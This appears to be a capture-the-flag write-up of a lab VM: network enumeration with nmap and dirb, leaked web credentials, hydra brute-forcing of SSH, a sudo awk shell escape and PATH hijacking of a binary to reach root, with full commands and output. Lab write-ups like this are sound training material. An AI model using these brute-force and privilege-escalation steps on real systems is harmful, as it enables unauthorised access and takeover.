@@ -1,1 +1,348 @@
+			ENUMERATION
+
+---ifconfig---
+
+                                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 8006893  bytes 10609053107 (9.8 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4156951  bytes 459159644 (437.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 80  bytes 6597 (6.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 80  bytes 6597 (6.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+                
+---netdiscover---
+                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200 
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                             
+                                                                                                             
+ 164 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 9840                                          
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00     41    2460  Unknown vendor                                            
+ 10.0.2.2        52:54:00:12:35:00     41    2460  Unknown vendor                                            
+ 10.0.2.3        08:00:27:be:c9:1d     41    2460  PCS Systemtechnik GmbH                                    
+ 10.0.2.33       08:00:27:8a:d3:ef     41    2460  PCS Systemtechnik GmbH                                    
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.33 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 17:47 +03
+Nmap scan report for 10.0.2.33
+Host is up (0.00096s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
+|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
+|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Nebula Lexus Labs
+MAC Address: 08:00:27:8A:D3:EF (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|storage-misc
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), Synology DiskStation Manager 5.X (90%), Netgear RAIDiator 4.X (87%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28
+Aggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.4 (97%), Linux 5.0 - 5.5 (95%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%), Linux 3.4 - 3.10 (91%), Linux 5.1 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.13 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.96 ms 10.0.2.33
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds
+           
+
+                                 
+---we see open http and ssh ports, lets do some web enum---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.33
+
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Apr  3 17:53:42 2024
+URL_BASE: http://10.0.2.33/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.33/ ----
+==> DIRECTORY: http://10.0.2.33/img/                                                                                      
++ http://10.0.2.33/index.php (CODE:200|SIZE:3479)                                                                         
+==> DIRECTORY: http://10.0.2.33/login/                                                                                    
++ http://10.0.2.33/server-status (CODE:403|SIZE:274)                                                                      
+                                                                                                                          
+---- Entering directory: http://10.0.2.33/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                          
+---- Entering directory: http://10.0.2.33/login/ ----
++ http://10.0.2.33/login/index.php (CODE:200|SIZE:1551)                                                                   
+                                                                                                                          
+-----------------
+END_TIME: Wed Apr  3 17:53:56 2024
+DOWNLOADED: 9224 - FOUND: 3
+          
+
+
+---there is a login page I found by going to the website, but we dont know any credentials, let's run ctfenum for further scanning---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 /opt/CTFEnum/CTFenum/CTFenum.py 10.0.2.33                
+======================================================================
+[!] Checking open ports
+======================================================================
+OPEN TCP PORTS:
+[!] nmap -Pn -T3 -n -p- 10.0.2.33
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:8A:D3:EF (Oracle VirtualBox virtual NIC)
+======================================================================
+[!] Generating Nmap output
+======================================================================
+
+[!] Attacking port 80
+[!] gobuster dir -u http://10.0.2.33:80 -w /opt/CTFEnum/CTFenum/mods/wordlist.txt -x .txt,.bak,.cgi,.html,.php -t 70 -z --no-error -k
+[!] URL: http://10.0.2.33:80
+
+/img                  (Status: 301) [Size: 304] [--> http://10.0.2.33/img/]
+/index.php            (Status: 200) [Size: 3479]
+/joinus               (Status: 301) [Size: 307] [--> http://10.0.2.33/joinus/]
+/login                (Status: 301) [Size: 306] [--> http://10.0.2.33/login/]
+
+
+
+---here we see a new page, joinus---
+
+---when we go there we some credentials---
+
+username = admin
+password = d46df8e6a5627debf930f7b5c8f3b083
+
+
+---lets go to the webpage and login---
+
+---here we enter an id and it shows us the user---
+
+
+id = 1
+role = Security
+user = pmccentral
+
+
+and
+
+id = 2
+role = Experiment 1
+username = experiment1
+
+
+
+---now that we have the usernames, we can bruteforce with hydra to learn the passwords 
+of this users for ssh---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# hydra -l pmccentral -P wordlists/rockyou.txt ssh://10.0.2.33
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-03 18:15:33
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.0.2.33:22/
+[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344234 to do in 1440:12h, 15 active
+[STATUS] 105.33 tries/min, 316 tries in 00:03h, 14344084 to do in 2269:39h, 15 active
+[22][ssh] host: 10.0.2.33   login: pmccentral   password: 999999999
+1 of 1 target successfully completed, 1 valid password found
+
+---We found the password---
+
+username = pmccentral
+password = 999999999
+
+
+
+				GAINING FOOTHOLD
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ssh pmccentral@10.0.2.33
+pmccentral@10.0.2.33's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Last login: Wed Apr  3 15:36:26 2024 from 10.0.2.15
+pmccentral@laboratoryuser:~$ 
+
+
+
+---I manually searched for a flag but no use, I found a list of employees tho---
+
+pmccentral@laboratoryuser:~$ cd ..
+pmccentral@laboratoryuser:/home$ ls
+laboratoryadmin  pmccentral
+pmccentral@laboratoryuser:/home$ cd pmccentral
+pmccentral@laboratoryuser:~$ ls
+desktop  documents  downloads
+pmccentral@laboratoryuser:~$ cd documents/
+pmccentral@laboratoryuser:~/documents$ ls
+employees.txt
+pmccentral@laboratoryuser:~/documents$ cat employees.txt 
+
+ --> LIST OF EMPLOYEES HERE <--
+
+
+
+
+---now lets try to find SUID---
+
+pmccentral@laboratoryuser:~$ sudo -l
+[sudo] password for pmccentral: 
+Matching Defaults entries for pmccentral on laboratoryuser:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pmccentral may run the following commands on laboratoryuser:
+    (laboratoryadmin) /usr/bin/awk
+
+
+---here means that we can run /usr/bin/awk as if we are laboratoryadmin---
+
+Awk: Is a scripting language used for manipulating data and generating reports. 
+The awk command programming language requires no compiling and allows us to 
+use variables, numeric and string functions, and logical operators. 
+
+
+---a quick visit to gtfobins to find how to use awk---
+
+
+---here we see the necessary sudo command which says that if we can run it as sudo, it can 
+be used maintain or elevate privilege acces and access the file system---
+
+
+
+pmccentral@laboratoryuser:/home$ sudo -u laboratoryadmin  awk 'BEGIN {system("/bin/sh")}'
+$ whoami
+laboratoryadmin
+$ id
+uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
+$ ls
+laboratoryadmin  pmccentral
+cd laboratoryadmin
+$ ls
+autoScripts  desktop  documents  downloads  home  user.txt
+$ cat user.txt    
+---First User Flag---
+
+
+
+				PRIVILEGE ESCALATION
+
+
+---I roam around the laboratoryadmin's files---
+
+$ cd autoScripts
+$ ls
+head  PMCEmployees
+$ cat head
+bash -p
+$ cat PMCEmployees
+
+---we see some crypric text here, looks like a binary file---
+
+
+---we saw that PMCEmployees is a binary file, we can use strings command and---
+
+
+Strings: Is a command used to extract readable strings from a binary file
+
+
+
+$ strings PMCEmployees
+
+Showing top 10 best employees of PMC company
+head /home/pmccentral/documents/employees.txt
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+
+
+---we see this location within the text file, lets use it---
+
+
+$ head /home/pmccentral/documents/employees.txt
+aren
+Aarika
+Abagael
+Abagail
+Abbe
+Abbey
+Abbi
+Abbie
+Abby
+Abbye
+
+
+Head: head command returns the first 10 lines of a txt file
+
+
+
+---but there is also another fake head folder in /laboratoryadmin/autoScripts---
+
+---so in order to execute the PMCEmployees binary we need to change the path---
+
+$ pwd
+/home/laboratoryadmin/autoScripts
+$ PATH=$(pwd):$PATH
+$ ./PMCEmployees
+root@laboratoryuser:~/autoScripts# whoami
+root
+
+---now we are root---
+
+root@laboratoryuser:/home# cd /root
+root@laboratoryuser:/root# ls
+root.txt  snap
+root@laboratoryuser:/root# cat root.txt 
+---Root User Flag---
+
 
